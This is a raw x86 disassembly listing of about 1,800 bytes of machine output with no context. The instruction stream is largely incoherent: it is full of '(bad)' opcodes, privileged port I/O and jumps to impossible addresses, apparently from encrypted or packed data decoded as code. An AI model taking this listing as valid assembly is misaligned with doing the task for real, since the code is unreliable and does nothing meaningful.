  41b890:	pop    ebp
  41b891:	push   ds
  41b892:	aam    0xae
  41b894:	mov    ecx,0xb74e82c7
  41b899:	mov    BYTE PTR ds:0x401aa026,cl
  41b89f:	jnp    0x41b86a
  41b8a1:	mov    ebp,0x80dcfe2e
  41b8a6:	add    BYTE PTR [edx],bh
  41b8a8:	mov    dl,0x6f
  41b8aa:	jmp    0x28ab4b02
  41b8af:	fdivr  DWORD PTR [esi+ecx*4+0x4719e0f6]
  41b8b6:	(bad)  
  41b8b7:	dec    eax
  41b8b8:	mov    ebx,ebx
  41b8ba:	mov    ecx,0x423d7bd0
  41b8bf:	xchg   edi,eax
  41b8c0:	lahf   
  41b8c1:	xor    edx,DWORD PTR [ebp+0x639fb03a]
  41b8c7:	sub    edx,esp
  41b8c9:	push   0x8a1812f5
  41b8ce:	xor    ebx,DWORD PTR [edi-0x2a104899]
  41b8d4:	cli    
  41b8d5:	stos   DWORD PTR es:[edi],eax
  41b8d6:	test   BYTE PTR [ebx+0x20],0xaa
  41b8da:	ret    
  41b8db:	leave  
  41b8dc:	sbb    eax,0x11b3365f
  41b8e1:	aad    0x3b
  41b8e3:	je     0x41b95e
  41b8e5:	retf   
  41b8e6:	pop    edi
  41b8e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8e8:	dec    ebx
  41b8e9:	imul   eax,DWORD PTR [eax-0x6f],0x9cdc2a9d
  41b8f0:	sti    
  41b8f1:	xchg   esp,eax
  41b8f2:	jae    0x41b883
  41b8f4:	dec    ebx
  41b8f5:	push   es
  41b8f6:	inc    edi
  41b8f7:	repz imul ebp,DWORD PTR [ecx],0xffffff95
  41b8fb:	shl    DWORD PTR [edx-0x3d738bba],1
  41b901:	push   ss
  41b902:	push   eax
  41b903:	loope  0x41b92a
  41b905:	cmp    DWORD PTR [ebp+0x2e],esp
  41b908:	pop    ebx
  41b909:	retf   
  41b90a:	frstor ds:0xbdc365cd
  41b910:	pop    ss
  41b911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b913:	mov    al,ds:0xcf722e50
  41b918:	pop    ecx
  41b919:	out    0x4a,al
  41b91b:	inc    eax
  41b91c:	leave  
  41b91d:	scas   al,BYTE PTR es:[edi]
  41b91e:	xchg   ebx,eax
  41b91f:	loop   0x41b920
  41b921:	rcl    BYTE PTR [ecx-0x6d],0x69
  41b925:	test   eax,0xad8bf682
  41b92a:	leave  
  41b92b:	sub    edx,DWORD PTR [ebp-0x64]
  41b92e:	mov    al,BYTE PTR [edi]
  41b930:	outs   dx,BYTE PTR ss:[esi]
  41b932:	mov    al,0xc1
  41b934:	popa   
  41b935:	mov    dl,0xa4
  41b937:	call   0xe268:0xf4f08e8e
  41b93e:	or     al,0xe
  41b940:	je     0x41b8eb
  41b942:	sti    
  41b943:	sub    DWORD PTR [edi],esp
  41b945:	dec    ebp
  41b946:	jb     0x41b8d9
  41b948:	fisttp WORD PTR [ebx]
  41b94a:	out    dx,al
  41b94b:	mov    ds:0xe9b88a82,al
  41b950:	ret    0x4b9a
  41b953:	lahf   
  41b954:	mov    dh,0x2a
  41b956:	sub    eax,0xa7cb0369
  41b95b:	(bad)  
  41b95c:	and    al,0x54
  41b95e:	out    0x8,eax
  41b960:	test   BYTE PTR [edi+0x51],bh
  41b963:	popf   
  41b964:	nop
  41b965:	sbb    esi,esi
  41b967:	and    esp,esp
  41b969:	jle    0x41b931
  41b96b:	push   edx
  41b96c:	dec    eax
  41b96d:	out    dx,al
  41b96e:	pop    ebx
  41b96f:	jle    0x41b9b5
  41b971:	retf   0x3e44
  41b974:	add    ebx,edx
  41b976:	stc    
  41b977:	test   BYTE PTR [esi-0x79a8bb09],bl
  41b97d:	xor    DWORD PTR [ebp+0x52e48776],eax
  41b983:	cmp    cl,BYTE PTR ds:0x36b2d136
  41b989:	rcr    BYTE PTR [esi-0x6a],0x6a
  41b98d:	cs jb  0x41b937
  41b990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b991:	and    eax,0x5f75d4cd
  41b996:	test   DWORD PTR [edx-0x3],edi
  41b999:	jle    0x41ba18
  41b99b:	inc    esi
  41b99c:	add    eax,0xacf6512d
  41b9a1:	imul   eax,DWORD PTR [edi],0x35
  41b9a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9a5:	cmp    al,0x64
  41b9a7:	rcr    DWORD PTR [ecx+0x5f],cl
  41b9aa:	xchg   ebp,eax
  41b9ab:	and    BYTE PTR [ebp+0x153c6f14],dl
  41b9b1:	cmp    BYTE PTR [eax+0x130f14fc],ah
  41b9b7:	inc    ebp
  41b9b8:	ret    0x68c1
  41b9bb:	out    dx,al
  41b9bc:	or     bl,al
  41b9be:	cmp    BYTE PTR ds:0xdfe986c3,ah
  41b9c4:	dec    ebp
  41b9c5:	xor    ah,BYTE PTR [eax-0x7e]
  41b9c8:	push   es
  41b9c9:	in     al,0xfb
  41b9cb:	cwde   
  41b9cc:	sbb    bl,BYTE PTR [eax+0x16]
  41b9cf:	clc    
  41b9d0:	es xchg esp,eax
  41b9d2:	js     0x41b9c8
  41b9d4:	in     al,0xfc
  41b9d6:	popa   
  41b9d7:	inc    eax
  41b9d8:	cmp    al,0x44
  41b9da:	mov    eax,ds:0x356f3b61
  41b9df:	adc    eax,0x2d8b19b
  41b9e4:	xchg   DWORD PTR [edx+0x1b499fbf],edi
  41b9ea:	stos   DWORD PTR es:[edi],eax
  41b9eb:	push   ds
  41b9ec:	repnz xchg esp,eax
  41b9ee:	cmp    DWORD PTR [edi-0x3e828edf],edx
  41b9f4:	mov    BYTE PTR [eax+0x44],ch
  41b9f7:	shr    ch,0x5d
  41b9fa:	jne    0x41b9a8
  41b9fc:	push   edi
  41b9fd:	pop    ecx
  41b9fe:	inc    DWORD PTR [edx-0x7a]
  41ba01:	inc    esi
  41ba02:	test   DWORD PTR [edx+0x3f],edi
  41ba05:	push   0x6bb310d2
  41ba0a:	fist   DWORD PTR [edx]
  41ba0c:	aas    
  41ba0d:	lea    ebx,[ecx+esi*4+0x78bc0a44]
  41ba14:	setle  BYTE PTR [ebx+0x5d580029]
  41ba1b:	mov    esp,?
  41ba1d:	mov    dh,0x38
  41ba1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba20:	sbb    dh,BYTE PTR [ebp+0x78cd55a6]
  41ba26:	scas   al,BYTE PTR es:[edi]
  41ba27:	bound  edi,QWORD PTR [esi-0x5175d46f]
  41ba2d:	dec    esi
  41ba2e:	loopne 0x41ba61
  41ba30:	jne    0x41ba1d
  41ba32:	push   ds
  41ba33:	cwde   
  41ba34:	add    DWORD PTR ds:0x71c2963b,edi
  41ba3a:	pop    es
  41ba3b:	ins    DWORD PTR es:[edi],dx
  41ba3c:	iret   
  41ba3d:	mov    edi,esi
  41ba3f:	cmp    BYTE PTR [edi+0x6a],bl
  41ba42:	sbb    dl,BYTE PTR [ebp-0x4]
  41ba45:	std    
  41ba46:	fld    DWORD PTR [eax]
  41ba48:	out    0x13,al
  41ba4a:	dec    eax
  41ba4b:	scas   al,BYTE PTR es:[edi]
  41ba4c:	inc    ecx
  41ba4d:	mov    ds,eax
  41ba4f:	sub    ebx,esi
  41ba51:	jns    0x41baa0
  41ba53:	or     eax,DWORD PTR [ebp+0x2e884e3c]
  41ba59:	dec    esi
  41ba5a:	pop    edi
  41ba5b:	sbb    eax,0xfa3906d7
  41ba60:	sbb    edi,DWORD PTR [eax+0x7f36780b]
  41ba66:	inc    ebx
  41ba67:	and    bl,BYTE PTR [edi]
  41ba69:	imul   ebx,DWORD PTR [esi],0x1
  41ba6c:	arpl   sp,sp
  41ba6e:	cmc    
  41ba6f:	mov    ebp,DWORD PTR [edi+0x1]
  41ba72:	mov    ds:0x5fbb2f8b,eax
  41ba77:	jnp    0x41baf5
  41ba79:	sbb    al,0x9f
  41ba7b:	and    BYTE PTR cs:[edi],dl
  41ba7e:	sub    edi,0x79ac1050
  41ba84:	adc    eax,0x9ac34fc4
  41ba89:	and    ebp,DWORD PTR [ebp-0x9]
  41ba8c:	mov    dl,0x23
  41ba8e:	adc    BYTE PTR [edi-0x6c8eb722],dl
  41ba94:	loope  0x41bab4
  41ba96:	frstpm(287 only) 
  41ba98:	scas   al,BYTE PTR es:[edi]
  41ba99:	and    esp,esi
  41ba9b:	jmp    0x41bab8
  41ba9d:	lods   al,BYTE PTR ds:[esi]
  41ba9e:	mov    dl,0x57
  41baa0:	jno    0x41bad8
  41baa2:	xor    DWORD PTR [eax-0x7c13cac5],0x1a
  41baa9:	xor    al,0x76
  41baab:	out    dx,al
  41baac:	pop    ecx
  41baad:	jnp    0x41bad1
  41baaf:	outs   dx,BYTE PTR ds:[esi]
  41bab0:	aas    
  41bab1:	or     al,0x31
  41bab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bab4:	mov    ecx,0x8f03c371
  41bab9:	cdq    
  41baba:	mov    al,0xfa
  41babc:	int3   
  41babd:	push   0x9
  41babf:	add    bl,0xd2
  41bac2:	lds    edx,FWORD PTR [ebp+0x33]
  41bac5:	cmp    ah,BYTE PTR [ebp-0x2fe563e2]
  41bacb:	adc    eax,0x8373e061
  41bad0:	sub    eax,0x74993e81
  41bad5:	dec    edx
  41bad6:	adc    ebx,edx
  41bad8:	mov    ah,0xd3
  41bada:	clc    
  41badb:	jg     0x41bab9
  41badd:	jp     0x41bab3
  41badf:	jmp    0x99d6:0xd9787791
  41bae6:	adc    eax,0x4d45b9f6
  41baeb:	rcl    DWORD PTR ds:0xfc940e53,0x79
  41baf2:	leave  
  41baf3:	out    0x46,eax
  41baf5:	(bad)  
  41baf6:	std    
  41baf7:	idiv   DWORD PTR [edi+0x70]
  41bafa:	mov    esi,0x416e41ac
  41baff:	je     0x41bad4
  41bb01:	fsub   QWORD PTR ds:0xa94d4039
  41bb07:	fs cdq 
  41bb09:	xchg   ebp,eax
  41bb0a:	adc    al,0x42
  41bb0c:	inc    esp
  41bb0d:	out    dx,al
  41bb0e:	retf   
  41bb0f:	or     bl,BYTE PTR [eax+0x67]
  41bb12:	mov    ebp,ebx
  41bb14:	into   
  41bb15:	push   cs
  41bb16:	adc    ebp,DWORD PTR [ebx+edx*1]
  41bb19:	xor    BYTE PTR [esi-0x5e],bl
  41bb1c:	mov    dh,0xde
  41bb1e:	xchg   esp,eax
  41bb1f:	mov    eax,0x398dad5
  41bb24:	dec    esp
  41bb25:	or     al,0x63
  41bb27:	and    al,0x70
  41bb29:	and    edi,ebp
  41bb2b:	aad    0x43
  41bb2d:	data16 xlat BYTE PTR ds:[ebx]
  41bb2f:	jns    0x41bb92
  41bb31:	in     eax,dx
  41bb32:	ss and ebx,0xd4d8a607
  41bb39:	dec    esi
  41bb3a:	jmp    0x41bb2c
  41bb3c:	mov    ebp,esi
  41bb3e:	popf   
  41bb3f:	imul   ebx,DWORD PTR [edx+eiz*1],0x38b04437
  41bb46:	pop    ds
  41bb47:	fwait
  41bb48:	xlat   BYTE PTR ds:[ebx]
  41bb49:	mov    dh,0xeb
  41bb4b:	pushf  
  41bb4c:	sub    al,0xb0
  41bb4e:	jecxz  0x41bb38
  41bb50:	dec    eax
  41bb51:	add    BYTE PTR [esp+ebp*4],ch
  41bb54:	jns    0x41bb6a
  41bb56:	push   es
  41bb57:	cld    
  41bb58:	xchg   esi,eax
  41bb59:	pop    ss
  41bb5a:	mov    dh,0x2b
  41bb5c:	jl     0x41bb14
  41bb5e:	in     eax,0xe0
  41bb60:	cmc    
  41bb61:	xchg   esi,eax
  41bb62:	call   0x83edba1c
  41bb67:	cmp    al,0xb4
  41bb69:	cmp    DWORD PTR [edx],edi
  41bb6b:	cmp    BYTE PTR [esi],al
  41bb6d:	pop    esp
  41bb6e:	shr    DWORD PTR [esi],1
  41bb70:	pop    esi
  41bb71:	jb     0x41bb64
  41bb73:	scas   eax,DWORD PTR es:[edi]
  41bb74:	cmc    
  41bb75:	inc    esi
  41bb76:	iret   
  41bb77:	jo     0x41bba4
  41bb79:	je     0x41bb90
  41bb7b:	out    0x94,al
  41bb7d:	jb     0x41bb93
  41bb7f:	aas    
  41bb80:	and    eax,0x9606e993
  41bb85:	xchg   ecx,eax
  41bb86:	sub    ah,BYTE PTR [ebp-0x6d]
  41bb89:	add    eax,0xd4bf48c
  41bb8e:	inc    edx
  41bb8f:	add    eax,0xec9fd2dc
  41bb94:	loope  0x41bb16
  41bb96:	and    BYTE PTR [esi],dh
  41bb98:	ret    0x4df8
  41bb9b:	pop    ebx
  41bb9c:	(bad)  
  41bb9d:	xlat   BYTE PTR ds:[ebx]
  41bb9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb9f:	pop    edx
  41bba0:	dec    ebx
  41bba1:	loope  0x41bb43
  41bba3:	das    
  41bba4:	fisttp WORD PTR [ecx-0x17]
  41bba7:	iret   
  41bba8:	aam    0x4b
  41bbaa:	or     ebx,DWORD PTR [eax+0x7464ff8d]
  41bbb0:	popa   
  41bbb1:	iret   
  41bbb2:	stos   BYTE PTR es:[edi],al
  41bbb3:	pop    ss
  41bbb4:	mov    dx,0x5b6b
  41bbb8:	jns    0x41bb87
  41bbba:	pop    edi
  41bbbb:	jmp    0x41bbec
  41bbbd:	lods   al,BYTE PTR ds:[esi]
  41bbbe:	repz xlat BYTE PTR ds:[ebx]
  41bbc0:	fwait
  41bbc1:	mov    al,ds:0xe4be77fd
  41bbc6:	cmp    eax,0xfac17e59
  41bbcc:	inc    eax
  41bbcd:	mov    ds:0x7584e545,al
  41bbd2:	jne    0x41bbe9
  41bbd4:	pop    edx
  41bbd5:	xor    ah,BYTE PTR [esi+0x12]
  41bbd8:	jp     0x41bc27
  41bbda:	pop    ebp
  41bbdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbdc:	mov    eax,DWORD PTR [ebx-0x3e]
  41bbdf:	int    0xf5
  41bbe1:	test   BYTE PTR [ebx-0xd],al
  41bbe4:	imul   edi,esi,0xa2d48f51
  41bbea:	xchg   ebp,eax
  41bbeb:	mov    ch,0x8b
  41bbed:	fwait
  41bbee:	mov    esi,0x66d67770
  41bbf3:	sub    DWORD PTR [esi+0x5fefded3],ecx
  41bbf9:	nop
  41bbfa:	or     eax,0xa60d9189
  41bbff:	jecxz  0x41bbe0
  41bc01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc02:	push   esp
  41bc03:	cmp    bh,BYTE PTR [eax+0x7]
  41bc06:	gs aaa 
  41bc08:	popf   
  41bc09:	(bad)  
  41bc0a:	ins    BYTE PTR es:[edi],dx
  41bc0b:	jnp    0x41bc57
  41bc0d:	outs   dx,DWORD PTR ds:[esi]
  41bc0e:	fild   QWORD PTR [esi]
  41bc10:	sbb    eax,0xe00398f0
  41bc15:	fcomp  DWORD PTR [edi]
  41bc17:	(bad)
  41bc1b:	mov    ah,0x6e
  41bc1d:	daa    
  41bc1e:	ds inc eax
  41bc20:	add    DWORD PTR [edx+ecx*2-0x1f],edi
  41bc24:	cmp    al,0x34
  41bc26:	data16 in al,dx
  41bc28:	les    ebx,FWORD PTR [edi]
  41bc2a:	ja     0x41bbda
  41bc2c:	dec    ecx
  41bc2d:	lock jl 0x41bc92
  41bc30:	push   ss
  41bc31:	cwde   
  41bc32:	stos   BYTE PTR es:[edi],al
  41bc33:	and    BYTE PTR [edx-0x406f5564],dh
  41bc39:	jmp    0x41bc54
  41bc3b:	push   ebx
  41bc3c:	and    BYTE PTR [ecx+0x1d],dl
  41bc3f:	pushf  
  41bc40:	cmp    eax,0xeb37f993
  41bc45:	add    al,0x17
  41bc47:	pop    eax
  41bc48:	ror    BYTE PTR [eax-0x77],1
  41bc4b:	test   BYTE PTR [esp+eiz*8+0x15],dl
  41bc4f:	sbb    dl,BYTE PTR [esi+0x271b48e]
  41bc55:	je     0x41bcc5
  41bc57:	mov    bh,0x51
  41bc59:	xor    eax,0x8ec48482
  41bc5e:	(bad)  
  41bc5f:	and    ebx,DWORD PTR ds:0xfe5ec604
  41bc65:	mov    BYTE PTR [ecx-0x33],dl
  41bc68:	ret    0xe64d
  41bc6b:	sub    BYTE PTR [esi+0x6c],0x9d
  41bc6f:	rcr    DWORD PTR [ebx-0x4b],1
  41bc72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc73:	jmp    0x41bc79
  41bc75:	sbb    ebx,esi
  41bc77:	adc    edx,DWORD PTR [edx-0x22ea8b4a]
  41bc7d:	sbb    al,BYTE PTR [edi+esi*1+0x1b]
  41bc81:	leave  
  41bc82:	xchg   esp,edx
  41bc84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc85:	push   edx
  41bc86:	rcl    BYTE PTR [ebx-0x7c],1
  41bc89:	out    dx,eax
  41bc8a:	jmp    0x87e78bd6
  41bc8f:	loope  0x41bcb1
  41bc91:	fcmovnb st,st(2)
  41bc93:	push   ebp
  41bc94:	jp     0x41bcd9
  41bc96:	push   edi
  41bc97:	mov    ecx,0x79a2cc98
  41bc9c:	sbb    edi,DWORD PTR [esi+0x11]
  41bc9f:	sar    BYTE PTR [edx-0x47],cl
  41bca2:	sbb    BYTE PTR [ebx+0x3d],ch
  41bca5:	(bad)  
  41bca7:	loop   0x41bd14
  41bca9:	mov    dl,0x4c
  41bcab:	and    DWORD PTR [eax],esi
  41bcad:	lds    eax,FWORD PTR [ebp-0x6d]
  41bcb0:	dec    ebp
  41bcb1:	dec    ecx
  41bcb2:	or     DWORD PTR gs:[edi+edi*2-0xb],esi
  41bcb7:	ds (bad) 
  41bcb9:	mov    eax,0x2b444f46
  41bcbe:	int    0x88
  41bcc0:	and    al,0xc3
  41bcc2:	mov    ecx,0xcaac8983
  41bcc7:	scas   al,BYTE PTR es:[edi]
  41bcc8:	mov    esp,0xa51dd919
  41bccd:	int3   
  41bcce:	xor    edi,DWORD PTR [esi+0x53]
  41bcd1:	mov    edi,DWORD PTR [ebp+0x7b2319d7]
  41bcd7:	jg     0x41bc8d
  41bcd9:	pop    ds
  41bcda:	frstor [esi-0xcb14543]
  41bce0:	jge    0x41bce5
  41bce2:	iret   
  41bce3:	dec    esp
  41bce4:	inc    esp
  41bce5:	not    DWORD PTR ds:0x54d21324
  41bceb:	jns    0x41bd30
  41bced:	nop
  41bcee:	pop    es
  41bcef:	imul   esi,eax,0x76f010f
  41bcf5:	in     eax,0x52
  41bcf7:	mov    dl,0x49
  41bcf9:	fld    DWORD PTR [esp+ebx*8]
  41bcfc:	ds sahf 
  41bcfe:	cmp    al,0xcc
  41bd00:	add    al,dh
  41bd02:	fwait
  41bd03:	jae    0x41bd3e
  41bd05:	dec    edi
  41bd06:	hlt    
  41bd07:	scas   al,BYTE PTR es:[edi]
  41bd08:	enter  0xf41e,0x5e
  41bd0c:	adc    BYTE PTR [ebx],dl
  41bd0e:	push   ecx
  41bd0f:	ja     0x41bcd6
  41bd11:	cli    
  41bd12:	ds enter 0x58c2,0x48
  41bd17:	adc    BYTE PTR [esi+0x75],bl
  41bd1a:	push   esp
  41bd1b:	jmp    0x41bcab
  41bd1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd1e:	ds ds nop
  41bd21:	jle    0x41bd77
  41bd23:	mov    ebx,0x74d3cf56
  41bd28:	enter  0x92d0,0x77
  41bd2c:	hlt    
  41bd2d:	jae    0x41bd18
  41bd2f:	cwde   
  41bd30:	in     eax,0xc2
  41bd32:	cdq    
  41bd33:	lahf   
  41bd34:	loop   0x41bd2c
  41bd36:	cmp    al,0x85
  41bd38:	push   ecx
  41bd39:	loop   0x41bda7
  41bd3b:	ins    BYTE PTR es:[edi],dx
  41bd3c:	sub    BYTE PTR [esi+0x51],bl
  41bd3f:	jle    0x41bcd8
  41bd41:	mov    al,0xf1
  41bd43:	adc    DWORD PTR [esi+edi*1+0x11],ebx
  41bd47:	sub    al,0xee
  41bd49:	and    ch,BYTE PTR [esi+0x57]
  41bd4c:	jno    0xd0154a9b
  41bd52:	mov    cl,0x9c
  41bd54:	push   esi
  41bd55:	or     ecx,DWORD PTR [ecx]
  41bd57:	inc    ecx
  41bd58:	aas    
  41bd59:	mov    ebp,0xdaf0ac01
  41bd5e:	lods   eax,DWORD PTR ds:[esi]
  41bd5f:	pop    esi
  41bd60:	in     eax,dx
  41bd61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd62:	dec    ebp
  41bd63:	int    0xf7
  41bd65:	jne    0x41bd0c
  41bd67:	enter  0x59d,0xea
  41bd6b:	bound  edi,QWORD PTR [eax+0x370df505]
  41bd71:	mov    dh,0xfa
  41bd73:	les    edx,FWORD PTR ds:0x22065db9
  41bd79:	push   eax
  41bd7a:	push   edi
  41bd7b:	mov    ds:0x315b2dc9,eax
  41bd80:	sar    BYTE PTR [eax],cl
  41bd82:	adc    DWORD PTR [ecx+0x18c94e0c],ebp
  41bd88:	ret    0xf663
  41bd8b:	popf   
  41bd8c:	inc    edi
  41bd8d:	push   ebp
  41bd8e:	(bad)  
  41bd8f:	xchg   esi,eax
  41bd90:	out    dx,eax
  41bd91:	mov    esi,DWORD PTR [edi]
  41bd93:	(bad)  
  41bd94:	and    al,0xc8
  41bd96:	ret    0x87
  41bd99:	jb     0x41bdd3
  41bd9b:	or     al,BYTE PTR [edi-0x15]
  41bd9e:	stos   BYTE PTR es:[edi],al
  41bd9f:	mov    ds:0x60a548d1,al
  41bda4:	inc    edi
  41bda5:	fadd   DWORD PTR [ecx+0x4]
  41bda8:	jl     0x41bd7c
  41bdaa:	mov    al,BYTE PTR [edx-0x2b6e166f]
  41bdb0:	mov    eax,esi
  41bdb2:	test   al,0xe8
  41bdb4:	cli    
  41bdb5:	rcl    BYTE PTR [ebp+0x38dd48f],cl
  41bdbb:	jmp    0x41bd92
  41bdbd:	enter  0x4f0c,0x35
  41bdc1:	enter  0xc933,0xf3
  41bdc5:	jb     0x41be38
  41bdc7:	fild   DWORD PTR [edi]
  41bdc9:	xor    BYTE PTR [ecx+0x32f9e206],bl
  41bdcf:	loop   0x41be38
  41bdd1:	call   0x4958:0x270cc769
  41bdd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdd9:	inc    esp
  41bdda:	int3   
  41bddb:	inc    ecx
  41bddc:	jne    0x41bdb5
  41bdde:	js     0x41bd6f
  41bde0:	iret   
  41bde1:	out    dx,al
  41bde2:	pop    eax
  41bde3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bde4:	mov    dl,BYTE PTR [eax-0x80]
  41bde7:	das    
  41bde8:	mov    ebp,0x204bef02
  41bded:	fwait
  41bdee:	jb     0x41bda1
  41bdf0:	mov    ebx,cs
  41bdf2:	xchg   ebx,eax
  41bdf3:	or     DWORD PTR [edx+0x34],0x44
  41bdf7:	aaa    
  41bdf8:	outs   dx,DWORD PTR ds:[esi]
  41bdf9:	lods   al,BYTE PTR ds:[esi]
  41bdfa:	out    dx,al
  41bdfb:	jns    0x41bdfb
  41bdfd:	out    0xe8,al
  41bdff:	adc    ch,BYTE PTR [ecx-0x1d]
  41be02:	push   esi
  41be03:	inc    eax
  41be04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be05:	add    bl,BYTE PTR [eax]
  41be07:	(bad)
  41be0a:	inc    ebx
  41be0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be0c:	(bad)  
  41be0d:	xchg   ebx,eax
  41be0e:	out    0x93,al
  41be10:	daa    
  41be11:	aam    0xfd
  41be13:	test   eax,0x4d6bc9e0
  41be18:	retf   0x8dc4
  41be1b:	ret    0x88d3
  41be1e:	fstp   QWORD PTR [ecx+0x74]
  41be21:	fucomi st,st(6)
  41be23:	int3   
  41be24:	(bad)  
  41be25:	stos   DWORD PTR es:[edi],eax
  41be26:	adc    eax,0xba175043
  41be2b:	scas   al,BYTE PTR es:[edi]
  41be2c:	pop    esi
  41be2d:	pop    ds
  41be2e:	mov    esp,0x77657a77
  41be33:	icebp  
  41be34:	(bad)  
  41be35:	mov    dh,0xe6
  41be37:	ret    
  41be38:	mov    ebp,0xceb9d1f9
  41be3d:	jb     0x41be6a
  41be3f:	mov    bl,dh
  41be41:	fmulp  st(3),st
  41be43:	xor    esi,DWORD PTR [edi-0x27]
  41be46:	push   esi
  41be47:	ds mov al,0x4f
  41be4a:	rcr    BYTE PTR [eax-0x5f194d3e],cl
  41be50:	add    dh,BYTE PTR [ecx-0x6ddf193b]
  41be56:	sbb    ah,dl
  41be58:	sbb    BYTE PTR [ecx-0x70e84d26],bh
  41be5e:	mov    WORD PTR [ebp-0x2a],?
  41be61:	ror    ebp,0x9d
  41be64:	or     eax,0x79275737
  41be69:	jb     0x41bebc
  41be6b:	pop    ecx
  41be6c:	bnd jmp 0xa2a201f2
  41be72:	add    DWORD PTR [edx+0x73b8c2cb],esp
  41be78:	pop    eax
  41be79:	loop   0x41be6e
  41be7b:	leave  
  41be7c:	inc    edx
  41be7d:	clc    
  41be7e:	retf   0x9853
  41be81:	retf   
  41be82:	dec    esp
  41be83:	pushf  
  41be84:	xchg   edi,eax
  41be85:	dec    esp
  41be86:	loopne 0x41be3d
  41be88:	push   0xd82fd294
  41be8d:	adc    eax,0x10c78280
  41be92:	sub    al,0x10
  41be94:	enter  0xa125,0x1a
  41be98:	stc    
  41be99:	inc    ecx
  41be9a:	in     al,dx
  41be9b:	mov    edx,DWORD PTR [edi]
  41be9d:	inc    ebp
  41be9e:	push   esp
  41be9f:	push   ebx
  41bea0:	jbe    0x41be29
  41bea2:	mov    esi,0xcb59e772
  41bea7:	and    ebx,DWORD PTR [ecx+0x1be0600e]
  41bead:	dec    esi
  41beae:	dec    edx
  41beaf:	into   
  41beb0:	js     0x41be3f
  41beb2:	sub    DWORD PTR [eax+eax*8+0x4f25e6c3],ebx
  41beb9:	adc    eax,0x74ac3bb0
  41bebe:	out    dx,al
  41bebf:	mov    al,0x5c
  41bec1:	pop    edi
  41bec2:	fneni(8087 only) 
  41bec4:	(bad)  [edi-0x62]
  41bec7:	(bad)  
  41bec8:	scas   al,BYTE PTR es:[edi]
  41bec9:	mov    WORD PTR [edx+0x29],gs
  41becc:	push   eax
  41becd:	or     ecx,DWORD PTR [esi+0x4209b9f0]
  41bed3:	mov    DWORD PTR [edx+0x6708498a],esi
  41bed9:	push   edx
  41beda:	pop    es
  41bedb:	mov    dh,0xcc
  41bedd:	or     eax,0xcd88f3a1
  41bee2:	cld    
  41bee3:	push   es
  41bee4:	int3   
  41bee5:	mov    BYTE PTR [edi],ah
  41bee7:	fdivr  DWORD PTR [ecx+0x15]
  41beea:	outs   dx,DWORD PTR ds:[esi]
  41beeb:	daa    
  41beec:	dec    esp
  41beed:	add    esi,edi
  41beef:	xor    BYTE PTR [esi-0x278699af],ch
  41bef5:	(bad)  
  41bef6:	retf   
  41bef7:	jmp    0xa4ad:0x795f161c
  41befe:	jl     0x41be8a
  41bf00:	add    esi,esi
  41bf02:	int3   
  41bf03:	rcl    DWORD PTR [ecx],cl
  41bf05:	jp     0x41beee
  41bf07:	(bad)  
  41bf08:	idiv   esi
  41bf0a:	nop
  41bf0b:	adc    ah,BYTE PTR [ecx+0x70]
  41bf0e:	les    di,DWORD PTR [eax+ebp*2]
  41bf12:	dec    esi
  41bf13:	sbb    BYTE PTR [edx],bl
  41bf15:	pop    edx
  41bf16:	xor    bh,BYTE PTR [ebp-0x793500a6]
  41bf1c:	mov    cl,0x3
  41bf1e:	call   0x8ae8:0x744db135
  41bf25:	adc    al,0x3d
  41bf27:	push   edi
  41bf28:	cmp    eax,0x509ef70c
  41bf2d:	div    BYTE PTR [ebp+0x7461324d]
  41bf33:	aad    0x25
  41bf35:	xor    DWORD PTR [edi+0x24da8d6a],eax
  41bf3b:	sub    BYTE PTR [ecx],dh
  41bf3d:	xor    DWORD PTR [esi+0x52f07f9],esp
  41bf43:	aam    0x23
  41bf45:	jle    0x41beec
  41bf47:	mov    ds:0x1c9292df,eax
  41bf4c:	lahf   
  41bf4d:	xchg   BYTE PTR [eax+ebx*2-0x4],dl
  41bf51:	ficom  WORD PTR [edi-0x1e962624]
  41bf57:	add    edx,DWORD PTR [edx-0x75fb2caf]
  41bf5d:	ss inc esi
  41bf5f:	retf   0xabf3
  41bf62:	inc    esi
  41bf63:	sar    BYTE PTR [esi-0x1d],1
  41bf66:	das    
  41bf67:	or     eax,0x67990cb2
  41bf6c:	push   ebx
  41bf6d:	daa    
  41bf6e:	in     al,0xfe
  41bf70:	mov    dl,0xe9
  41bf72:	mov    dh,0x38
  41bf74:	in     eax,dx
  41bf75:	cwde   
  41bf76:	pop    esi
  41bf77:	ror    BYTE PTR [edx],1
  41bf79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf7a:	shl    esp,0x71
  41bf7d:	pusha  
  41bf7e:	dec    DWORD PTR [edi]
  41bf80:	hlt    
  41bf81:	int3   
  41bf82:	and    BYTE PTR [edi+0x1c],cl
  41bf85:	or     al,0x3a
  41bf87:	icebp  
  41bf88:	jg     0x41bf8d
  41bf8a:	je     0x41bff1
  41bf8c:	lea    ecx,[edx+0x1fff23fe]
  41bf92:	ins    DWORD PTR es:[edi],dx
  41bf93:	dec    edx
  41bf94:	retf   0x4380
  41bf97:	loope  0x41bfc1
  41bf99:	fstp   QWORD PTR [esp+edx*1+0x914523]
  41bfa0:	retf   
  41bfa1:	cli    
  41bfa2:	mov    cs,esp
  41bfa4:	push   edi
  41bfa5:	scas   al,BYTE PTR es:[edi]
  41bfa6:	adc    bl,dl
  41bfa8:	xor    al,0x3e
  41bfaa:	ror    BYTE PTR [ebp-0x21],0xb3
